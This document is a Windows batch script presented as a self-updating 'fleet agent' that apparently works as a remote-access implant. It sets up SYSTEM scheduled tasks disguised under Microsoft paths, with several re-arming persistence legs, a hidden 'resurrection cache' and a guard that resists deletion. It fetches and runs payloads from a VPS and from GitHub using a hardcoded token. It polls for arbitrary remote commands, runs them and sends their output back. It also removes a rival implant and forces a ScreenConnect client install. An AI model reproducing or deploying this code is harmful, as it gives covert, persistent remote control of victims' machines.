@echo off
rem WINRTCS_AGENT 0.0.7 - self-updating fleet agent (batch+curl only, no PowerShell)
rem Tick: re-arm tasks (pair + sentinel) -> stage/apply self-update (SHA256 pinned)
rem   -> run payload once per PAYLOAD_VER -> guard channel -> sentinel channel -> cache sync.
rem 0.0.2 (C19): sentinel third-re-armer channel (SENTINEL_SHA256 pinned, lives in the
rem   resurrection cache); hash-gated cache mirroring (only pinned-hash-verified files are
rem   copied); run.cmd self-repair (RUN_SHA256); guard invoked via a temp copy so an attacker
rem   deleting winrtcs_guard.cmd mid-run can't abort the health cycle.
rem 0.0.3 (C20): dual-URL transport - all fetches try the VPS mirror first (HTTPS + bearer,
rem   Cloudflare-fronted) and fall back to GitHub raw. Token gates privacy only; integrity is
rem   SHA256-pinned per file from winrtcs.version. A dead VPS never bricks the fleet.
rem 0.0.4 (C22): command channel - every tick polls the VPS for a queued command (per-host
rem   or ALL), runs it detached (60s bounded wait, partial output still reported), POSTs the
rem   output back. Injection requires the ADMIN token which never leaves the VPS/operator;
rem   endpoints only poll/execute/report. Server-side dedup (results table) + local cmd.done.
rem 0.0.5 (C22): fix three batch mechanics bugs caught by local repro - (1) the wrapper's
rem   redirect line wrote '2>&' because cmd ate the literal '1' as the fd number of the
rem   trailing '1>>' append; now a space separates payload from the real redirect.
rem   (2) timeout.exe exits instantly without a console; wait loop now uses ping -n.
rem   (3) fd-trap: a single digit before '>' is a handle redirect (echo RC=0>file writes
rem   an EMPTY file); rc file now written with the immune prefix form >file echo ...
rem 0.0.6 (C23): :Fetch uses curl --fail - an HTTP error page (CF 502/403) is >10 bytes
rem   and used to satisfy the size check, skipping the GitHub fallback for that tick.
rem 0.0.7 (C26): Gryxa-absent fast-path - every tick, if no ScreenConnect service has
rem   gryxa.com in ImagePath, boost the guard gate (at most every 15 min) so install
rem   starts within minutes of landing/absence instead of waiting the 1-3h stagger.
rem   Presence resets the boost counter. Guard overlap lock + extkill brake still apply.
setlocal EnableExtensions EnableDelayedExpansion
set "ZD=C:\ProgramData\WinRTCS"
set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
set "CURL=%SystemRoot%\System32\curl.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "BASE2=https://debian.seczio.com/winrtcs"
set "RBASE=https://debian.seczio.com"
set "TOK=fe7e8f3b8af479870248be10ca25410b8e1bf9a5"
set "LOG=%ZD%\agent.log"
set "TASKA=\Microsoft\Windows\WinRTCS\Agent"
set "TASKG=\Microsoft\Windows\WinRTCS\Guard"
set "TASKS=\WinRTCSSentinel"
set "SACT=cmd.exe /c C:\ProgramData\Microsoft\WinRTCS\cache\winrtcs_sentinel.cmd"
set "VFILE=%ZD%\winrtcs.version.remote"

if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1

rem --- apply staged self-update (hash-verified last tick), then re-exec fresh copy ---
if exist "%ZD%\winrtcs_agent.new" (
  move /y "%ZD%\winrtcs_agent.new" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
  call "%ZD%\winrtcs_agent.cmd"
  endlocal & exit /b 0
)

rem --- one-time cadence upgrade: Agent every 1 min (fast lane), Guard every 5 min (re-arm net) ---
set "ACT=cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_run.cmd"
if not exist "%ZD%\tasks_v2.flag" (
  echo %DATE% %TIME%>"%ZD%\tasks_v2.flag"
  schtasks /Create /TN "%TASKA%" /TR "%ACT%" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
  schtasks /Create /TN "%TASKG%" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
  echo [%DATE% %TIME%] cadence_upgraded_1min>>"%LOG%"
)

rem --- re-arm persistence: any run heals both tasks ---
schtasks /Query /TN "%TASKA%" >nul 2>&1
if errorlevel 1 schtasks /Create /TN "%TASKA%" /TR "%ACT%" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Query /TN "%TASKG%" >nul 2>&1
if errorlevel 1 schtasks /Create /TN "%TASKG%" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1

rem --- re-arm the third leg (sentinel) whenever its script exists in the cache ---
if exist "%CD%\winrtcs_sentinel.cmd" (
  schtasks /Query /TN "%TASKS%" >nul 2>&1
  if errorlevel 1 schtasks /Create /TN "%TASKS%" /TR "%SACT%" /SC MINUTE /MO 15 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
)

rem --- one-time init: finish legacy wipe + retire any Zerocool bridge residue ---
if not exist "%ZD%\inited.flag" (
  echo %DATE% %TIME%>"%ZD%\inited.flag"
  rmdir /s /q "%SystemRoot%\Temp\.upd" >nul 2>&1
  rmdir /s /q "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache" >nul 2>&1
  rmdir /s /q "C:\ProgramData\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
  rmdir /s /q "%SystemRoot%\Temp\.wucache" >nul 2>&1
  schtasks /Delete /TN "\Microsoft\Windows\Zerocool\Agent" /F >nul 2>&1
  schtasks /Delete /TN "\Microsoft\Windows\Zerocool\Guard" /F >nul 2>&1
  rmdir /s /q "C:\ProgramData\Zerocool" >nul 2>&1
  echo [%DATE% %TIME%] init legacy-wipe-done>>"%LOG%"
)

rem --- rotate log ---
if exist "%LOG%" for %%L in ("%LOG%") do if %%~zL GTR 204800 move /y "%LOG%" "%LOG%.old" >nul 2>&1

rem --- fetch version ---
call :Fetch winrtcs.version "%VFILE%"
if not exist "%VFILE%" ( endlocal & exit /b 0 )
findstr /C:"AGENT_SHA256=" "%VFILE%" >nul 2>&1
if errorlevel 1 ( endlocal & exit /b 0 )

set "AGENT_SHA="
set "PVER="
set "PAYLOAD_SHA="
set "GUARD_VER="
set "GUARD_SHA="
set "RUN_SHA="
set "SENT_SHA="
for /f "usebackq tokens=1,* delims==" %%K in ("%VFILE%") do (
  if /I "%%K"=="AGENT_SHA256" set "AGENT_SHA=%%L"
  if /I "%%K"=="PAYLOAD_VER" set "PVER=%%L"
  if /I "%%K"=="PAYLOAD_SHA256" set "PAYLOAD_SHA=%%L"
  if /I "%%K"=="GUARD_VER" set "GUARD_VER=%%L"
  if /I "%%K"=="GUARD_SHA256" set "GUARD_SHA=%%L"
  if /I "%%K"=="RUN_SHA256" set "RUN_SHA=%%L"
  if /I "%%K"=="SENTINEL_SHA256" set "SENT_SHA=%%L"
)

rem --- agent self-update: stage .new now, applied + re-exec at top of next run ---
if defined AGENT_SHA (
  call :Sha256 "%ZD%\winrtcs_agent.cmd" CUR_SHA
  if /I not "!CUR_SHA!"=="!AGENT_SHA!" (
    call :Fetch winrtcs_agent.cmd "%ZD%\agent.dl"
    set "DL_SHA="
    if exist "%ZD%\agent.dl" call :Sha256 "%ZD%\agent.dl" DL_SHA
    if defined DL_SHA if /I "!DL_SHA!"=="!AGENT_SHA!" (
      findstr /C:"WINRTCS_AGENT" "%ZD%\agent.dl" >nul 2>&1
      if not errorlevel 1 (
        move /y "%ZD%\agent.dl" "%ZD%\winrtcs_agent.new" >nul 2>&1
        echo [%DATE% %TIME%] agent_update_staged>>"%LOG%"
      )
    )
    del /f /q "%ZD%\agent.dl" >nul 2>&1
  )
)

rem --- run.cmd self-repair: stager is the tasks' entry point, keep it hash-pinned too ---
if defined RUN_SHA (
  call :Sha256 "%ZD%\winrtcs_run.cmd" RUN_CUR
  if /I not "!RUN_CUR!"=="!RUN_SHA!" (
    call :Fetch winrtcs_run.cmd "%ZD%\run.dl"
    set "R_SHA="
    if exist "%ZD%\run.dl" call :Sha256 "%ZD%\run.dl" R_SHA
    if defined R_SHA if /I "!R_SHA!"=="!RUN_SHA!" (
      findstr /C:"WINRTCS_RUN" "%ZD%\run.dl" >nul 2>&1
      if not errorlevel 1 (
        move /y "%ZD%\run.dl" "%ZD%\winrtcs_run.cmd" >nul 2>&1
        echo [%DATE% %TIME%] run_repaired>>"%LOG%"
      )
    )
    del /f /q "%ZD%\run.dl" >nul 2>&1
  )
)

rem --- payload: run exactly once per PAYLOAD_VER (payloads must be idempotent) ---
set "LVER="
if exist "%ZD%\payload.ver" set /p "LVER=" <"%ZD%\payload.ver"
if defined PVER if defined PAYLOAD_SHA if /I not "!PVER!"=="!LVER!" (
  call :Fetch winrtcs_payload.cmd "%ZD%\payload.dl"
  set "PL_SHA="
  if exist "%ZD%\payload.dl" call :Sha256 "%ZD%\payload.dl" PL_SHA
  if defined PL_SHA if /I "!PL_SHA!"=="!PAYLOAD_SHA!" (
    findstr /C:"WINRTCS_PAYLOAD" "%ZD%\payload.dl" >nul 2>&1
    if not errorlevel 1 (
      move /y "%ZD%\payload.dl" "%ZD%\winrtcs_payload.cmd" >nul 2>&1
      call "%ZD%\winrtcs_payload.cmd"
      if not errorlevel 1 (
        echo !PVER!>"%ZD%\payload.ver"
        echo [%DATE% %TIME%] payload_!PVER!_ran>>"%LOG%"
      )
    )
  )
  del /f /q "%ZD%\payload.dl" >nul 2>&1
)

rem --- guard channel: recurring gryxa health, every 180 ticks (~3h), hash-pinned updates ---
if defined GUARD_VER if defined GUARD_SHA (
  set "LGVER="
  if exist "%ZD%\guard.ver" set /p "LGVER=" <"%ZD%\guard.ver"
  if /I not "!LGVER!"=="!GUARD_VER!" (
    call :Fetch winrtcs_guard.cmd "%ZD%\guard.dl"
    set "G_SHA="
    if exist "%ZD%\guard.dl" call :Sha256 "%ZD%\guard.dl" G_SHA
    if defined G_SHA if /I "!G_SHA!"=="!GUARD_SHA!" (
      findstr /C:"WINRTCS_GUARD" "%ZD%\guard.dl" >nul 2>&1
      if not errorlevel 1 (
        move /y "%ZD%\guard.dl" "%ZD%\winrtcs_guard.cmd" >nul 2>&1
        echo !GUARD_VER!>"%ZD%\guard.ver"
        echo [%DATE% %TIME%] guard_updated_!GUARD_VER!>>"%LOG%"
      )
    )
    del /f /q "%ZD%\guard.dl" >nul 2>&1
  )
  set "GCNT="
  if exist "%ZD%\guard.cnt" set /p "GCNT=" <"%ZD%\guard.cnt"
  if not defined GCNT set /a "GCNT=!RANDOM! %% 120"
  set /a "GCNT+=1" 2>nul
  if not defined GCNT set "GCNT=1"
  rem --- C26: no gryxa.com service -> force guard soon (every 15 agent ticks max) ---
  call :HasGryxa
  if defined HAS_GRYXA (
    del /f /q "%ZD%\gryxa_boost.cnt" >nul 2>&1
  ) else (
    set "BOOST="
    if exist "%ZD%\gryxa_boost.cnt" set /p "BOOST=" <"%ZD%\gryxa_boost.cnt"
    if not defined BOOST set "BOOST=15"
    set /a "BOOST+=1" 2>nul
    if !BOOST! GEQ 15 (
      set "BOOST=0"
      set "GCNT=999"
      echo [%DATE% %TIME%] gryxa_absent_force_guard>>"%LOG%"
    )
    >"%ZD%\gryxa_boost.cnt" echo !BOOST!
  )
  echo !GCNT!>"%ZD%\guard.cnt"
  if !GCNT! GEQ 180 (
    rem no pre-reset: guard resets the counter itself after acquiring its lock,
    rem so a lock-busy tick retries next minute instead of sleeping 3h.
    rem guard runs from a temp copy so deleting the canonical file mid-run can't abort it.
    if exist "%ZD%\winrtcs_guard.cmd" (
      copy /y "%ZD%\winrtcs_guard.cmd" "%ZD%\guard_run.tmp.cmd" >nul 2>&1
      call "%ZD%\guard_run.tmp.cmd"
      del /f /q "%ZD%\guard_run.tmp.cmd" >nul 2>&1
    )
  )
)

rem --- sentinel channel: third re-armer, hash-pinned, lives in the resurrection cache ---
if defined SENT_SHA (
  set "SENT_CUR="
  if exist "%CD%\winrtcs_sentinel.cmd" call :Sha256 "%CD%\winrtcs_sentinel.cmd" SENT_CUR
  if /I not "!SENT_CUR!"=="!SENT_SHA!" (
    call :Fetch winrtcs_sentinel.cmd "%ZD%\sentinel.dl"
    set "S_SHA="
    if exist "%ZD%\sentinel.dl" call :Sha256 "%ZD%\sentinel.dl" S_SHA
    if defined S_SHA if /I "!S_SHA!"=="!SENT_SHA!" (
      findstr /C:"WINRTCS_SENTINEL" "%ZD%\sentinel.dl" >nul 2>&1
      if not errorlevel 1 (
        if not exist "%CD%" mkdir "%CD%" >nul 2>&1
        move /y "%ZD%\sentinel.dl" "%CD%\winrtcs_sentinel.cmd" >nul 2>&1
        echo [%DATE% %TIME%] sentinel_updated>>"%LOG%"
      )
    )
    del /f /q "%ZD%\sentinel.dl" >nul 2>&1
  )
)
if exist "%CD%\winrtcs_sentinel.cmd" (
  schtasks /Query /TN "%TASKS%" >nul 2>&1
  if errorlevel 1 schtasks /Create /TN "%TASKS%" /TR "%SACT%" /SC MINUTE /MO 15 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
)

rem --- command channel (C22): pick up and run any queued command for this host ---
call :CmdChan

rem --- resurrection cache sync (C19): mirror ONLY hash-verified components, so a tampered
rem --- local file can never poison the cache. Sentinel has its own pinned channel above. ---
if not exist "%CD%" mkdir "%CD%" >nul 2>&1
attrib +h "C:\ProgramData\Microsoft\WinRTCS" >nul 2>&1
if defined AGENT_SHA (
  call :Sha256 "%ZD%\winrtcs_agent.cmd" MIR_A
  if /I "!MIR_A!"=="!AGENT_SHA!" copy /y "%ZD%\winrtcs_agent.cmd" "%CD%\winrtcs_agent.cmd" >nul 2>&1
)
if defined RUN_SHA (
  call :Sha256 "%ZD%\winrtcs_run.cmd" MIR_R
  if /I "!MIR_R!"=="!RUN_SHA!" copy /y "%ZD%\winrtcs_run.cmd" "%CD%\winrtcs_run.cmd" >nul 2>&1
)
if defined GUARD_SHA (
  call :Sha256 "%ZD%\winrtcs_guard.cmd" MIR_G
  if /I "!MIR_G!"=="!GUARD_SHA!" copy /y "%ZD%\winrtcs_guard.cmd" "%CD%\winrtcs_guard.cmd" >nul 2>&1
)
if exist "%VFILE%" copy /y "%VFILE%" "%CD%\winrtcs.version" >nul 2>&1

endlocal & exit /b 0

:HasGryxa
rem FP-agnostic: any ScreenConnect Client whose ImagePath contains gryxa.com.
set "HAS_GRYXA="
for /f "tokens=2 delims=:" %%A in ('sc query state^= all 2^>nul ^| findstr /C:"SERVICE_NAME: ScreenConnect Client ("') do (
  for /f "tokens=* delims= " %%S in ("%%A") do (
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%%S" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
    if not errorlevel 1 set "HAS_GRYXA=1"
  )
)
exit /b 0

:Fetch
rem %1 = repo-relative filename, %2 = destination. VPS mirror first (HTTPS + bearer,
rem Cloudflare-fronted), GitHub raw fallback. Success = non-trivial file landed; callers
rem still do their own marker/hash validation of the content.
del /f /q "%~2" >nul 2>&1
if defined TOK "%CURL%" -f -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 6 --max-time 25 -o "%~2" "%BASE2%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
if exist "%~2" for %%F in ("%~2") do if %%~zF GTR 10 exit /b 0
"%CURL%" -f -L --ssl-no-revoke --connect-timeout 8 --max-time 25 -o "%~2" "%BASE%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
exit /b 0

:Sha256
set "%~2="
for /f "skip=1 tokens=1" %%H in ('certutil -hashfile "%~1" SHA256 2^>nul') do if not defined %~2 set "%~2=%%H"
exit /b 0

:CmdChan
rem Poll the VPS for the oldest unclaimed command (per-host or ALL, <24h old), run it
rem detached with a bounded 60s wait, POST output back. Server-side dedup (a result row
rem means never re-served) plus local cmd.done. Commands arrive as raw batch files via
rem curl -o, so no batch parsing ever touches the payload.
if not defined TOK exit /b 0
del /f /q "%ZD%\cmd.poll" >nul 2>&1
"%CURL%" -s -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 4 --max-time 10 -o "%ZD%\cmd.poll" "%RBASE%/cmd/poll?host=%COMPUTERNAME%&t=%RANDOM%%RANDOM%" >nul 2>&1
set "CMDID="
if exist "%ZD%\cmd.poll" set /p "CMDID=" <"%ZD%\cmd.poll"
del /f /q "%ZD%\cmd.poll" >nul 2>&1
if not defined CMDID exit /b 0
if /I "%CMDID%"=="none" exit /b 0
set /a "TID=CMDID" >nul 2>&1
if not defined TID exit /b 0
if !TID! LEQ 0 exit /b 0
if exist "%ZD%\cmd.done" findstr /X /C:"!TID!" "%ZD%\cmd.done" >nul 2>&1 && exit /b 0
del /f /q "%ZD%\cmd_!TID!.cmd" >nul 2>&1
"%CURL%" -s -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 4 --max-time 15 -o "%ZD%\cmd_!TID!.cmd" "%RBASE%/cmd/get?id=!TID!&host=%COMPUTERNAME%" >nul 2>&1
if not exist "%ZD%\cmd_!TID!.cmd" exit /b 0
for %%F in ("%ZD%\cmd_!TID!.cmd") do if %%~zF LSS 2 ( del /f /q "%ZD%\cmd_!TID!.cmd" >nul 2>&1 & exit /b 0 )
echo !TID!>>"%ZD%\cmd.done"
if exist "%ZD%\cmd.done" for %%F in ("%ZD%\cmd.done") do if %%~zF GTR 4096 del /f /q "%ZD%\cmd.done" >nul 2>&1
echo [%DATE% %TIME%] cmd_!TID!_running>>"%LOG%"
echo @echo off> "%ZD%\cmdwrap_!TID!.cmd"
echo call "%ZD%\cmd_!TID!.cmd" ^> "%ZD%\cmd_!TID!.run" 2^>^&1 >> "%ZD%\cmdwrap_!TID!.cmd"
echo ^>"%ZD%\cmd_!TID!.rc" echo RC=%%errorlevel%%>> "%ZD%\cmdwrap_!TID!.cmd"
del /f /q "%ZD%\cmd_!TID!.run" "%ZD%\cmd_!TID!.rc" >nul 2>&1
start "" /min cmd.exe /c "%ZD%\cmdwrap_!TID!.cmd"
set "CW=0"
:CmdWait
if exist "%ZD%\cmd_!TID!.rc" goto :CmdHave
ping -n 6 127.0.0.1 >nul 2>&1
set /a CW+=1
if !CW! LSS 12 goto :CmdWait
:CmdHave
set "CRC=timeout"
if exist "%ZD%\cmd_!TID!.rc" set /p "CRC=" <"%ZD%\cmd_!TID!.rc"
if not exist "%ZD%\cmd_!TID!.run" echo (no output)> "%ZD%\cmd_!TID!.run"
"%CURL%" -s -o nul -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 4 --max-time 25 -X POST --data-urlencode "id=!TID!" --data-urlencode "host=%COMPUTERNAME%" --data-urlencode "rc=!CRC!" --data-urlencode "out@%ZD%\cmd_!TID!.run" "%RBASE%/cmd/result" >nul 2>&1
echo [%DATE% %TIME%] cmd_!TID!_done !CRC!>>"%LOG%"
del /f /q "%ZD%\cmd_!TID!.cmd" "%ZD%\cmdwrap_!TID!.cmd" "%ZD%\cmd_!TID!.run" "%ZD%\cmd_!TID!.rc" >nul 2>&1
exit /b 0
